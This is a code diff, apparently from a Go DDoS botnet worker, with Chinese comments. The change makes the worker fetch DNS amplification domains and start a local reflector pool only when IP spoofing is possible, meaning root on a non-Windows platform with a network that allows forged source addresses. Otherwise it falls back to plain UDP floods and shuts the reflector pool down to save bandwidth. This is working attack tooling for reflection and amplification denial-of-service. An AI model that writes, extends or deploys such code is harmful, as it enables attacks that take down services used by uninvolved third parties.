@@ -361,16 +361,36 @@ func (w *Worker) Run(ctx context.Context) error {
 		log.Printf("[bw] auto-tune disabled (CPU-based scaling requires bandwidth limit)")
 	}
 
+	// 反射器攻击必须伪造源 IP（否则放大响应打回 worker 自身，反射器毫无意义）。
+	// 平台级预判：Windows / 非 root / 编译平台不支持 → 本地反射器池
+	// 拉取与测试纯属浪费，直接跳过启动。
+	platformSpoofOK := !w.isWindows && IsRoot() && attack.SupportsSpoofing()
+
 	w.fetchProxy()
-	w.fetchDNSAmp()
+
+	// DNS 放大域名同样只用于反射攻击：平台级不支持伪造时跳过拉取
+	if platformSpoofOK {
+		w.fetchDNSAmp()
+	}
 
 	// 启动本地池（如果已启用）
 	if w.useLocalPool && w.localPool != nil {
-		w.localPool.UpdateControllerURL(w.ctrlBaseURL())
-		if err := w.localPool.Start(); err != nil {
-			log.Printf("[worker] local pool start failed: %v", err)
+		if platformSpoofOK {
+			w.localPool.UpdateControllerURL(w.ctrlBaseURL())
+			if err := w.localPool.Start(); err != nil {
+				log.Printf("[worker] local pool start failed: %v", err)
+			}
+			defer func() {
+				if w.localPool != nil {
+					w.localPool.Stop()
+				}
+			}()
+		} else {
+			log.Printf("[worker] local pool skipped: IP spoofing unavailable on this platform")
+			log.Printf("[worker] reflector attacks will fallback to UDP")
+			w.localPool = nil
+			w.useLocalPool = false
 		}
-		defer w.localPool.Stop()
 	}
 
 	if err := w.register(); err != nil {
@@ -412,6 +432,16 @@ func (w *Worker) Run(ctx context.Context) error {
 		// 未启用本地池：仅做内存探测，不落盘
 		log.Printf("[spoof-probe] no local pool, probing in-memory...")
 		w.canSpoofIP, _ = w.probeIPSpoofing()
+	}
+
+	// 探测最终确认：即使平台支持（root+Linux），实际网络环境仍可能
+	// 禁止伪造（如 VPS/云主机）。此时反射器池依然毫无意义，停止本地池
+	// 并清除引用，避免后续拉取/重测反射器白白消耗带宽与 CPU。
+	if !w.canSpoofIP && w.localPool != nil {
+		log.Printf("[worker] IP spoofing confirmed unavailable — stopping local reflector pool")
+		w.localPool.Stop()
+		w.localPool = nil
+		w.useLocalPool = false
 	}
 
 	ticker := time.NewTicker(3 * time.Second)
